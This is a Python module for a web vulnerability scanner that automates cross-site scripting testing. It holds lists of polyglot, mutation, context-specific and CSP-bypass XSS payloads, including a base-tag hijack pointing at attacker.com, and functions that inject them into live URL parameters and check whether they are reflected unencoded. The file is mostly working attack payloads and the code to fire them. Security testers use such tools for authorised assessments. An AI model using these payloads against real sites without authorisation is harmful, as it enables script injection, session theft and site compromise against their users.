"""
Advanced XSS Module

Goes beyond simple reflected XSS:
1. DOM-based XSS — analyzes JavaScript sources/sinks
2. CSP bypass payloads
3. Polyglot XSS payloads (work across multiple contexts)
4. Mutation XSS (mXSS) via innerHTML parsing quirks
5. Event handler context detection
"""
import asyncio
import re
import logging
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx

logger = logging.getLogger(__name__)

# DOM XSS sources and sinks
DOM_SOURCES = [
    "document.URL", "document.documentURI", "document.URLUnencoded",
    "document.baseURI", "location", "location.href", "location.search",
    "location.hash", "location.pathname", "document.cookie",
    "document.referrer", "window.name", "history.pushState",
    "history.replaceState", "localStorage", "sessionStorage",
    "postMessage", "URLSearchParams",
]

DOM_SINKS = [
    "eval(", "setTimeout(", "setInterval(", "Function(",
    "document.write(", "document.writeln(",
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "onevent", ".src", ".href", ".action",
    "jQuery.html(", "$.html(", ".append(", ".prepend(",
    "$.globalEval(", "$.parseHTML(",
    "element.setAttribute(", "createContextualFragment(",
]

# Polyglot XSS payloads that work in multiple contexts
POLYGLOT_PAYLOADS = [
    # Works in: HTML, attribute, JS string, URL contexts
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0teledata%0a//-->*/alert()/*',
    # Short polyglot
    '"><img src=x onerror=alert(1)>//',
    # SVG-based
    '<svg/onload=alert(1)>',
    # Event handler without quotes
    '<img src=x onerror=alert`1`>',
    # Inside script tag context
    '</script><script>alert(1)</script>',
    # Template literal
    '${alert(1)}',
    # Breaks out of most contexts
    '\'"--><svg/onload=alert(1)>//',
]

# CSP bypass payloads (for common CSP misconfigs)
CSP_BYPASS_PAYLOADS = [
    # JSONP callback
    ('<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>', "jsonp_callback"),
    # Angular template injection (if Angular is loaded)
    ('{{constructor.constructor("alert(1)")()}}', "angular_csti"),
    # base tag hijack
    ('<base href="https://attacker.com/">', "base_hijack"),
    # Object tag
    ('<object data="javascript:alert(1)">', "object_tag"),
    # Meta redirect
    ('<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', "meta_redirect"),
]

# mXSS payloads (mutation XSS via innerHTML parsing)
MXSS_PAYLOADS = [
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    '<svg><desc><table><thead><tr><td><math><mi><style></style><img src=x onerror=alert(1)>',
    '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>',
]

# Context detection patterns
CONTEXT_PATTERNS = {
    "html_text": r'(?<=>)[^<]*{MARKER}[^<]*(?=<)',
    "html_attr_dq": r'="[^"]*{MARKER}[^"]*"',
    "html_attr_sq": r"='[^']*{MARKER}[^']*'",
    "html_attr_unq": r'=\s*{MARKER}[\s>]',
    "js_string_dq": r'"[^"]*{MARKER}[^"]*"',
    "js_string_sq": r"'[^']*{MARKER}[^']*'",
    "js_template": r'`[^`]*{MARKER}[^`]*`',
    "url_param": r'(src|href|action)=["\'][^"\']*{MARKER}',
    "css_context": r'(style|<style)[^>]*[^<]*{MARKER}',
}


class AdvancedXSS:
    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(10)

    async def check_dom_xss(self, client: httpx.AsyncClient, endpoints: list, base_url: str) -> list[dict]:
        """Analyze JavaScript for DOM-based XSS patterns."""
        findings = []
        pages_checked = set()

        for ep in endpoints[:30]:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if not url or url in pages_checked:
                continue
            pages_checked.add(url)

            try:
                async with self.rate_limit:
                    resp = await client.get(url)
                    if resp.status_code != 200:
                        continue

                    body = resp.text
                    # Extract inline scripts
                    scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
                    # Also check external script URLs
                    ext_scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)', body, re.IGNORECASE)

                    # Analyze inline scripts for source->sink patterns
                    for script in scripts:
                        sources_found = [s for s in DOM_SOURCES if s in script]
                        sinks_found = [s for s in DOM_SINKS if s in script]

                        if sources_found and sinks_found:
                            # High-risk: source flows to sink
                            findings.append({
                                "title": f"DOM XSS: source→sink in {urlparse(url).path}",
                                "url": url,
                                "severity": "high",
                                "vuln_type": "xss_dom",
                                "sources": sources_found,
                                "sinks": sinks_found,
                                "script_preview": script[:300],
                                "impact": f"DOM-based XSS via {sources_found[0]} → {sinks_found[0]}. "
                                         "Attacker can execute JavaScript through URL manipulation.",
                            })

                    # Check for dangerous jQuery patterns
                    if "$(" in body or "jQuery(" in body:
                        jquery_danger = re.findall(
                            r'\$\(\s*["\']?\s*#?\s*\+?\s*(location|document\.URL|window\.name|document\.referrer)',
                            body
                        )
                        if jquery_danger:
                            findings.append({
                                "title": f"DOM XSS: jQuery sink with user input in {urlparse(url).path}",
                                "url": url,
                                "severity": "high",
                                "vuln_type": "xss_dom",
                                "sources": jquery_danger,
                                "sinks": ["jQuery selector"],
                                "impact": "jQuery selector with user-controlled input enables DOM XSS.",
                            })

            except Exception:
                continue

        return findings

    async def check_context_xss(self, client: httpx.AsyncClient, url: str, param: str,
                                 method: str = "GET") -> list[dict]:
        """Detect reflection context and use context-appropriate payloads."""
        findings = []
        marker = "xSs7e5t"

        try:
            # Step 1: Send marker to detect reflection context
            async with self.rate_limit:
                if method == "GET":
                    resp = await self._inject_get(client, url, param, marker)
                else:
                    resp = await client.post(url, data={param: marker})

                if not resp or marker not in resp.text:
                    return findings

                body = resp.text
                context = self._detect_context(body, marker)

                if not context:
                    return findings

                logger.info(f"XSS context detected: {context} at {url} param={param}")

                # Step 2: Use context-specific payload
                payloads = self._get_context_payloads(context)

                for payload, check_fn in payloads:
                    async with self.rate_limit:
                        if method == "GET":
                            resp2 = await self._inject_get(client, url, param, payload)
                        else:
                            resp2 = await client.post(url, data={param: payload})

                        if resp2 and check_fn(resp2.text, payload):
                            findings.append({
                                "title": f"Context-aware XSS ({context}) in {urlparse(url).path}",
                                "url": url,
                                "param": param,
                                "severity": "high",
                                "vuln_type": "xss_reflected",
                                "context": context,
                                "payload": payload,
                                "impact": f"XSS in {context} context. Payload escapes the context and executes JavaScript.",
                            })
                            break  # One proof per param

        except Exception:
            pass
        return findings

    async def check_polyglot(self, client: httpx.AsyncClient, url: str, param: str,
                             method: str = "GET") -> list[dict]:
        """Test polyglot XSS payloads."""
        findings = []
        for payload in POLYGLOT_PAYLOADS:
            try:
                async with self.rate_limit:
                    if method == "GET":
                        resp = await self._inject_get(client, url, param, payload)
                    else:
                        resp = await client.post(url, data={param: payload})

                    if resp and payload in resp.text:
                        # Check if script context is intact (not encoded)
                        if "alert" in resp.text and ("onerror" in resp.text or "onload" in resp.text or "<script" in resp.text):
                            findings.append({
                                "title": f"Polyglot XSS in {urlparse(url).path}",
                                "url": url,
                                "param": param,
                                "severity": "high",
                                "vuln_type": "xss_reflected",
                                "payload": payload,
                                "impact": "Polyglot XSS payload bypasses multiple context filters.",
                            })
                            break
            except Exception:
                continue
        return findings

    async def check_csp_bypass(self, client: httpx.AsyncClient, url: str) -> list[dict]:
        """Analyze CSP header and suggest bypasses."""
        findings = []
        try:
            async with self.rate_limit:
                resp = await client.get(url)
                csp = resp.headers.get("content-security-policy", "")
                if not csp:
                    return findings

                weaknesses = self._analyze_csp(csp)
                if weaknesses:
                    findings.append({
                        "title": f"Weak CSP Policy on {urlparse(url).path}",
                        "url": url,
                        "severity": "low",
                        "vuln_type": "misconfig",
                        "csp_policy": csp,
                        "weaknesses": weaknesses,
                        "impact": "Content Security Policy has weaknesses that may allow XSS bypass: "
                                 + "; ".join(weaknesses),
                    })
        except Exception:
            pass
        return findings

    def _detect_context(self, body: str, marker: str) -> str | None:
        """Detect where the marker appears in the HTML."""
        for context_name, pattern in CONTEXT_PATTERNS.items():
            regex = pattern.replace("{MARKER}", re.escape(marker))
            if re.search(regex, body, re.DOTALL):
                return context_name
        return "html_text"  # Default

    def _get_context_payloads(self, context: str) -> list[tuple]:
        """Return payloads appropriate for the detected context."""
        def check_reflected(body, payload):
            return payload in body and ("alert" in body or "onerror" in body or "onload" in body)

        if context == "html_attr_dq":
            return [
                ('" onmouseover=alert(1) x="', check_reflected),
                ('" onfocus=alert(1) autofocus x="', check_reflected),
                ('"><svg/onload=alert(1)>', check_reflected),
            ]
        elif context == "html_attr_sq":
            return [
                ("' onmouseover=alert(1) x='", check_reflected),
                ("'><svg/onload=alert(1)>", check_reflected),
            ]
        elif context == "js_string_dq":
            return [
                ('";alert(1)//', check_reflected),
                ('"-alert(1)-"', check_reflected),
            ]
        elif context == "js_string_sq":
            return [
                ("';alert(1)//", check_reflected),
                ("'-alert(1)-'", check_reflected),
            ]
        elif context == "js_template":
            return [
                ("${alert(1)}", check_reflected),
                ("`-alert(1)-`", check_reflected),
            ]
        elif context == "url_param":
            return [
                ("javascript:alert(1)", check_reflected),
                ("data:text/html,<script>alert(1)</script>", check_reflected),
            ]
        else:  # html_text or unknown
            return [
                ("<img src=x onerror=alert(1)>", check_reflected),
                ("<svg/onload=alert(1)>", check_reflected),
                ("<details open ontoggle=alert(1)>", check_reflected),
            ]

    def _analyze_csp(self, csp: str) -> list[str]:
        """Find weaknesses in CSP policy."""
        weaknesses = []
        directives = {}
        for part in csp.split(";"):
            part = part.strip()
            if " " in part:
                key, val = part.split(" ", 1)
                directives[key] = val

        script_src = directives.get("script-src", directives.get("default-src", ""))

        if "'unsafe-inline'" in script_src:
            weaknesses.append("script-src allows 'unsafe-inline' — inline scripts execute")
        if "'unsafe-eval'" in script_src:
            weaknesses.append("script-src allows 'unsafe-eval' — eval() and similar are allowed")
        if "data:" in script_src:
            weaknesses.append("script-src allows data: URIs — can load scripts from data URLs")
        if "*" in script_src:
            weaknesses.append("script-src uses wildcard — any domain can serve scripts")
        if "http:" in script_src:
            weaknesses.append("script-src allows http: — scripts over insecure HTTP")
        if not directives.get("script-src") and "'unsafe-inline'" in directives.get("default-src", ""):
            weaknesses.append("No script-src directive, default-src allows unsafe-inline")

        # Check for JSONP-capable domains
        jsonp_domains = ["googleapis.com", "accounts.google.com", "cdnjs.cloudflare.com",
                         "ajax.googleapis.com", "cdn.jsdelivr.net"]
        for domain in jsonp_domains:
            if domain in script_src:
                weaknesses.append(f"script-src includes {domain} — JSONP callback bypass possible")

        return weaknesses

    async def _inject_get(self, client, url, param, value):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        new_url = urlunparse(parsed._replace(query=urlencode(flat)))
        return await client.get(new_url)
